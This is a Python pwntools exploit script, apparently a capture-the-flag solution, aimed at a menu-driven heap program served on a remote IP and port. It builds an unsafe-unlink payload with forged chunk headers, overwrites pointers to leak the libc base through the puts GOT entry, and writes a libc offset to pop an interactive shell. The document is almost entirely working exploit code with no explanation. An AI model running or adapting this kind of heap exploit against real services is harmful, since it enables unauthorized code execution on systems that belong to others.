from pwn import *
local = 0
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./pwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("111.33.164.4","50007")
    libc=ELF("libc-2.19.so")
elf=ELF("./pwn")
def debug():
    gdb.attach(a,'''
    b *0x00000000040094B
    ''')
def menu(idx):
    a.sendlineafter("choice >>",str(idx))

def add(size):
    menu(1)
    a.sendlineafter("size:",str(size))
def show(idx):
    menu(2)
    a.sendlineafter("id:",str(idx))
def edit(idx,size,content):
    menu(3)
    a.sendlineafter("id:",str(idx))
    a.sendlineafter("size:",str(size))
    a.sendafter(":",content)
def delete(idx):
    menu(4)
    a.sendlineafter("id:",str(idx))
def debug():
    gdb.attach(a)
ptr=0x0000000006020E0
#debug()
add(0x88)#0
add(0x88)#1
add(0x10)#2
add(0x10)#3
edit(3,0x100,'/bin/sh\x00'+'\n')
payload=p64(0)+p64(0x81)+p64(ptr-0x18)+p64(ptr-0x10)+'A'*(0x80-0x20)
payload+=p64(0x80)+p64(0x90)
edit(0,0x100,payload+'\n')
delete(1)
#debug()
free_got=elf.got["puts"]
edit(0,0x100,'A'*0x18+p64(free_got)*3+'\n')
show(0)
a.recvuntil("Your data:")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["puts"]
print hex(libc_base)
edit(2,8,p64(libc_base+0x41320))
#a.sendlineafter("choice >>","/bin/sh\x00")

a.interactive()
